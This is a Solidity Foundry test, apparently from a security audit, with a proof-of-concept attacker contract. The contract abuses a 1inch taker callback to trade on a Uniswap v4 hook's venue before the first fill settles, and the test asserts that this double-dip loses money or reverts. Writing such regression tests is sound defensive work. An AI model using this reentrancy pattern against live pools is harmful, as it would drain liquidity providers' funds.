// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { console2 } from "forge-std/console2.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { PoolKey } from "v4-core/types/PoolKey.sol";
import { SwapParams } from "v4-core/types/PoolOperation.sol";
import { TickMath } from "v4-core/libraries/TickMath.sol";
import { ISwapVM } from "@1inch/swap-vm/contracts/interfaces/ISwapVM.sol";
import { ITakerCallbacks } from "@1inch/swap-vm/contracts/interfaces/ITakerCallbacks.sol";
import { TakerTraitsLib } from "@1inch/swap-vm/contracts/libs/TakerTraits.sol";

import { UnisonHook } from "../../src/UnisonHook.sol";
import { UnisonStrategy } from "../../src/aqua/UnisonStrategy.sol";
import { UnisonPools } from "../../src/libraries/UnisonPools.sol";
import { UnisonFixture, IPoolSwapTest } from "../utils/UnisonFixture.sol";

/// @notice Audit PoC: a 1inch taker callback runs after SwapVM has priced the fill but before any coins move.
///         An attacker trades on the Uniswap venue inside that window, so both trades price off the same balances.
contract CallbackAttacker is ITakerCallbacks {
    ISwapVM immutable svm;
    IPoolSwapTest immutable v4;
    UnisonHook immutable hook;
    address immutable usdc;
    address immutable weth;
    uint256 innerAmount;

    constructor(ISwapVM _svm, IPoolSwapTest _v4, UnisonHook _hook, address _usdc, address _weth) {
        (svm, v4, hook, usdc, weth) = (_svm, _v4, _hook, _usdc, _weth);
        IERC20(_usdc).approve(address(_svm), type(uint256).max);
        IERC20(_usdc).approve(address(_v4), type(uint256).max);
        IERC20(_weth).approve(address(_v4), type(uint256).max);
    }

    function _v4swap(address tin, address tout, uint256 amt) internal {
        bool z = tin < tout;
        v4.swap(
            UnisonPools.key(address(hook), tin, tout),
            SwapParams({ zeroForOne: z, amountSpecified: -int256(amt), sqrtPriceLimitX96: z ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1 }),
            IPoolSwapTest.TestSettings(false, false),
            ""
        );
    }

    /// buy ETH with `amt` USDC on 1inch, and again on Uniswap from inside the callback; then sell all ETH back
    function attack(uint256 amt, bool nested) external {
        innerAmount = nested ? amt : 0;
        TakerTraitsLib.Args memory t;
        t.taker = address(this);
        t.isExactIn = true;
        t.useTransferFromAndAquaPush = true;
        t.isAToB = usdc < weth;
        t.hasPreTransferOutCallback = nested;
        ISwapVM.Order memory o = UnisonStrategy.order(hook.maker(), address(hook), usdc, weth, uint64(hook.venueNonce()));
        svm.swap(o, amt, TakerTraitsLib.build(t));
        if (!nested) _v4swap(usdc, weth, amt); // honest: second buy after the first settled
        _v4swap(weth, usdc, IERC20(weth).balanceOf(address(this)));
    }

    function preTransferOutCallback(address, address, address, address, uint256, uint256, bytes32, bytes calldata) external {
        require(msg.sender == address(svm), "only svm");
        if (innerAmount > 0) _v4swap(usdc, weth, innerAmount); // priced off the pre-fill balances
    }

    function preTransferInCallback(address, address, address, address, uint256, uint256, bytes32, bytes calldata) external { }
}

contract CrossVenueReentrancyTest is UnisonFixture {
    function setUp() public {
        setUpUnison();
    }

    function _run(bool nested) internal returns (int256 pnl) {
        CallbackAttacker a = new CallbackAttacker(ISwapVM(address(swapVM)), v4Router, hook, address(usdc), address(weth));
        usdc.mint(address(a), 20_000e6);
        uint256 before = usdc.balanceOf(address(a));
        try a.attack(4_000e6, nested) {
            pnl = int256(usdc.balanceOf(address(a))) - int256(before);
        } catch (bytes memory reason) {
            console2.log("attack reverted");
            console2.logBytes(reason);
            pnl = type(int256).min; // blocked
        }
    }

    /// Two buys of 4,000 USDC then a full sell-back must lose money, whether or not the second buy is nested
    /// inside a 1inch callback.
    function test_callbackWindowCannotBeUsedToDoubleDip() public {
        uint256 snap = vm.snapshotState();
        int256 honest = _run(false);
        vm.revertToState(snap);
        int256 nested = _run(true);
        console2.log("honest round trip pnl (USDC, 6 dec)", honest);
        console2.log("nested round trip pnl (USDC, 6 dec)", nested);
        assertLt(honest, 0, "honest loop must lose");
        assertLt(nested, 0, "nested loop must lose (or be blocked)");
    }
}
